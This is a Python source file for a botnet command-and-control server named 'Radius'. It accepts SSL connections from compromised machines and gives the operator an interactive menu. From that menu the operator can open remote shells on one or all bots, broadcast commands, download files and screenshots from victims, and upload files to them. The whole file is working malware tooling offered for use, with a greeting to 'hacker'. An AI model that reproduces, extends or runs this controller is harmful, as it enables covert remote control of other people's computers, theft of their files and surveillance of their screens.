import socket
import sys
import argparse
import colorama
import ssl

DATA_RECEIVE_SIZE = 1024 * 1024 * 256

argument_parser = argparse.ArgumentParser(description="Bot Net Controller")
argument_parser.add_argument("--host", "-host", help="Set host server IP")
argument_parser.add_argument("--port", "-p", help="Set server port")
argument_parser.add_argument("--maxclients", "-mc", help="Set max clients that can be connected to the server")

arguments = argument_parser.parse_args()

USAGE = "python3 botnet.py [SERVER IP] [SERVER PORT] [MAX CLIENTS]"
MENU_COMMANDS = ["list", "play", "remote all", "quit", "exit"
                 "listen", "help", "delete"]

MENU_HELP = "\nlisten - Listen for new connections\n"
MENU_HELP += "list - List all computers connected\n"
MENU_HELP += "play [computer_ip] - Start a remote shell with the specified computer\n"
MENU_HELP += "remote all -  Start a remote shell with all computers connected\n"
MENU_HELP += "delete [computer ip] - Deletes the computer with the specified ip address\n"
MENU_HELP += "quit - Exit botnet\n"
MENU_HELP += "exit - Same as 'quit'\n"

SHELL_HELP = "\ndownload [filename] - Downloads a file from the remote computer"
SHELL_HELP += "\nupload [filename] - Uploads a file from the Uploads/ folder to the remote computer current directory"
SHELL_HELP += "\nscreenshot - Takes a screenshot from the remote computer and save it in the Downloads folder"
SHELL_HELP += "\nsysinfo - Print a short text about the remote computer system\n"

BANNER = "\n\n"
BANNER += r""" 
/$$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$ /$$   /$$  /$$$$$$ 
| $$__  $$ /$$__  $$| $$__  $$|_  $$_/| $$  | $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$  | $$  | $$  | $$| $$  \__/
| $$$$$$$/| $$$$$$$$| $$  | $$  | $$  | $$  | $$|  $$$$$$ 
| $$__  $$| $$__  $$| $$  | $$  | $$  | $$  | $$ \____  $$
| $$  \ $$| $$  | $$| $$  | $$  | $$  | $$  | $$ /$$  \ $$
| $$  | $$| $$  | $$| $$$$$$$/ /$$$$$$|  $$$$$$/|  $$$$$$/
|__/  |__/|__/  |__/|_______/ |______/ \______/  \______/ 
"""

colorama.init(autoreset=True)

BANNER += colorama.Fore.CYAN + "\n\n[ Welcome Message ] : Hello hacker! Hope you enjoy! :)\n"
print(BANNER)

class FileFunctions:
    def download_file(self, comp_socket, file_name):
        print(colorama.Fore.GREEN + f"[+] Downloading {file_name}")
        try:
            comp_socket.settimeout(3)
            file_data = b''
            while True:
                try:
                    file_data += comp_socket.recv(DATA_RECEIVE_SIZE)
                except socket.timeout:
                    break

            with open(f"downloads/{file_name}", "wb") as new_file:
                new_file.write(file_data)
            print(colorama.Fore.GREEN + "[+] File Downloaded.\n")
        except Exception as e:
            print(f"[-] Error while downloading remote file : {e}\n")

    def upload_file(self, comp_socket, file_name):
        print(colorama.Fore.GREEN + f"[+] Uploading file {file_name}")
        try:
            with open(f"uploads/{file_name}", "rb") as file_handle:
                file_data = file_handle.read()
            comp_socket.sendall(file_data)
            print(colorama.Fore.GREEN + "[+] File uploaded.\n")
        except Exception as e:
            print(f"[-] Error while uploading file : {e}")


class BotnetServer(FileFunctions):
    def __init__(self):

        if not str(arguments.port).isdigit() or not str(arguments.maxclients).isdigit():
            argument_parser.print_help()
            sys.exit(0)

        ca_file = None
        certfile = "certs/sample.pem"
        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH, cafile=ca_file)
        self.ssl_context.load_cert_chain(certfile)

        self.ClientsConnected = {}
        self.server_addr = arguments.host
        self.server_port = int(arguments.port)
        self.max_clients = int(arguments.maxclients)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.server_addr, self.server_port))
        self.server_socket.listen(self.max_clients)

    def exit_properly(self):
        for computer_socket in self.ClientsConnected.values():
            computer_socket.sendall(b"server_exited")
            computer_socket.close()
        self.server_socket.close()
        print(colorama.Fore.GREEN + "\n[+] Bye.\n")

    def start_menu(self):
        while True:
            main_menu = str(input(colorama.Fore.LIGHTBLUE_EX + "[ radius@menu ] > " + colorama.Fore.RESET))
            if main_menu == "help":
                print(colorama.Fore.YELLOW + MENU_HELP)
            elif main_menu.startswith("play"):
                computer_ip = main_menu[5:]
                self._start_remote_shell(computer_ip)
            elif main_menu == "remote all":
                self.start_remote_all()
            elif main_menu == "listen":
                self.listen_con()
            elif main_menu == "list":
                self.list_con()
            elif main_menu.startswith("delete"):
                self.delete_client(main_menu[7:])
            elif main_menu == "exit" or main_menu == "quit":
                return

    def delete_client(self, computer_ip):
        if computer_ip not in self.ClientsConnected.keys():
            print(colorama.Fore.RED + f"[-] Computer {computer_ip} not connected to server\n")
            return
        comp_socket = self.ClientsConnected[computer_ip]
        try:
            comp_socket.sendall(b"server_exited")
            comp_socket.close()
        except Exception as e:
            print(colorama.Fore.RED + "[-] Error while deleting client properly.\n")
        del self.ClientsConnected[computer_ip]
        print(colorama.Fore.GREEN + "[+] Done.\n")

    def list_con(self):
        if len(self.ClientsConnected) == 0:
            print(colorama.Fore.RED + "[ info ] No clients connected yet\n")
            return
        print(colorama.Fore.GREEN + "\n+++ Listing Computers Connected +++\n")
        connected = len(self.ClientsConnected.keys())
        for computer_ip in self.ClientsConnected.keys():
            print(colorama.Fore.CYAN + f"[ info ] {computer_ip}")
        print(colorama.Fore.GREEN + f"\n[+] Total connected : {connected}")
        print("\n")

    def _start_remote_shell(self, computer_ip):
        if computer_ip not in self.ClientsConnected.keys():
            print(colorama.Fore.RED + f"[-] Computer with ip {computer_ip} not connected")
            return

        computer_socket = self.ClientsConnected[computer_ip]
        while True:
            try:
                command_comp = str(input(colorama.Fore.MAGENTA + f"[ radius@{computer_ip} ] > " + colorama.Fore.RESET)).encode()
                if command_comp == b"help":
                    print(colorama.Fore.YELLOW + SHELL_HELP)
                    continue
                computer_socket.sendall(command_comp)
                if command_comp == b"exit" or command_comp == b"quit":
                    break
                elif command_comp.startswith(b"download"):
                    self.download_file(computer_socket, command_comp[9:].decode())
                elif command_comp.startswith(b"upload"):
                    self.upload_file(computer_socket, command_comp[7:].decode())
                elif command_comp == b"screenshot":
                    self.get_screenshot(computer_socket)
                else:
                    print(colorama.Fore.CYAN + "[ info ] Receiving output")
                    try:
                        print(computer_socket.recv(DATA_RECEIVE_SIZE).decode('cp437'))
                    except KeyboardInterrupt:
                        continue

            except Exception as e:
                print(f"[-] Error {e}")
                return

    def get_screenshot(self, computer_socket):
        self.download_file(computer_socket, "screenshot.png")


    def _send_command_all(self, command):
        sent = 0
        for computer_ip in self.ClientsConnected.keys():
            try:
                computer_socket = self.ClientsConnected[computer_ip]
                computer_socket.sendall(command.encode() + b"_from_remote_all")
                sent += 1
            except socket.error:
                del self.ClientsConnected[computer_ip]
        return sent

    def start_remote_all(self):
        print(colorama.Fore.BLACK + colorama.Back.WHITE + "[ info ] From now on, all your commands are going to be sent to all computers connected to your botnet")
        while True:
            try:
                command_all = str(input(colorama.Fore.MAGENTA + "[ radius@all ] > " + colorama.Fore.RESET))
                if command_all == "exit" or command_all == "quit":
                    break
                n = self._send_command_all(command_all)
                print(colorama.Fore.GREEN + f"\n[+] Command send to {n} computer(s)")
            except KeyboardInterrupt:
                print(colorama.Fore.YELLOW + "\n[ info ] Going back to menu...\n")
                break

    def listen_con(self):
        print(colorama.Fore.GREEN + "\n[+] Listening for connections...")
        while True:
            try:
                new_computer, address = self.server_socket.accept()
                ssl_sock = self.ssl_context.wrap_socket(new_computer, server_side=True)
                new_computer_ip = address[0]
                if new_computer_ip in self.ClientsConnected.keys():
                    count = 0
                    for key in self.ClientsConnected.keys():
                        if key == new_computer_ip:
                            count += 1
                    new_computer_ip += f"[{count}]"
                    self.ClientsConnected.setdefault(new_computer_ip, ssl_sock)
                else:
                    self.ClientsConnected.setdefault(new_computer_ip, ssl_sock)
                print(colorama.Fore.GREEN + f"[+] Got new connection from {address[0]}")
            except KeyboardInterrupt:
                print(colorama.Fore.YELLOW + "\n[ info ] Exiting listening mode...\n")
                break


botnet = BotnetServer()
botnet.start_menu()
botnet.exit_properly()